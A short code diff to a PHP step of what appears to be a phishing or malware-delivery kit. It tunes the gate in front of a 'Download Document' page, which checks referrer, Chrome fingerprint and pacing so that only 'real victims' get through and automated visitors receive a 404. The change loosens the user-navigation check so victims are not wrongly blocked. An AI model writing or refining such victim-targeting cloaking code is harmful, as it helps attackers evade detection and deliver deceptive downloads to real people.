@@ -1,9 +1,11 @@
 <?php
 require __DIR__ . '/../lib.php';
 
-// Step 3: must arrive from download.php, full Chrome fingerprint,
-// user-initiated navigation (a human clicked "Download Document").
-gate_doc(['/download.php'], 4, true);
+// Step 3: must arrive from download.php, full Chrome fingerprint.
+// The load is scripted (2s spinner setTimeout), so Chrome sends
+// Sec-Fetch-User: ?0 even for a human click — requireUser must stay
+// false here or every real victim 404s. Pacing is enforced by minAge.
+gate_doc(['/download.php'], 4, false);
 
 $name = (string)($_GET['n'] ?? '');
 if ($name === '' || preg_match('/[^A-Za-z0-9_. -]/', $name)) { $name = make_name(); }
